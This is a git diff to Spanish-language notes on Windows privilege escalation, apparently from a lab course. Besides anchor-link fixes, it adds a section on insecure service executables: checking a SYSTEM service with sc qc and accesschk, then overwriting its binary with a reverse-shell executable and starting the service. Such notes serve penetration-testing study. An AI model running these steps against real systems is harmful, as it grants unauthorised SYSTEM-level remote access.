@@ -22,8 +22,8 @@ Técnicas utilizadas para escalar privilegios en sistemas basados en Windows.
 - [Privileged Groups](#whoami-groups)
 - [Servicios Vulnerables](#Servicios-Vulnerables)
   - [Insecure Permissions](#Insecure-Permissions)
-  - [Unquoted Service Path](#Unquoted-Service Path)
-  - [Weak Registry Permissions](#Weak-Registry Permissions)
+  - [Unquoted Service Path](#Unquoted-Service-Path)
+  - [Weak Registry Permissions](#Weak-Registry-Permissions)
 
 ## whoami priv
 
@@ -204,6 +204,25 @@ Iniciamos un listener en Parrot y luego iniciamos el servicio para generar una s
 ```cmd
 net start regsvc
 ```
+
+### Insecure Service Executables
+
+Primero debemos consultar el servicio  y verificar que se ejecuta con privilegios de SYSTEM (SERVICE_START_NAME).
+```cmd
+sc qc filepermsvc
+```
+
+Validamos si tenemos permisos para sobreescribir el binario del servicio `BINARY_PATH_NAME` 
+```cmd
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+Sobreescribimos el binario con una rev shell  e iniciamos el servicio
+```cmd
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+net start filepermsvc
+```
+
 
 
 
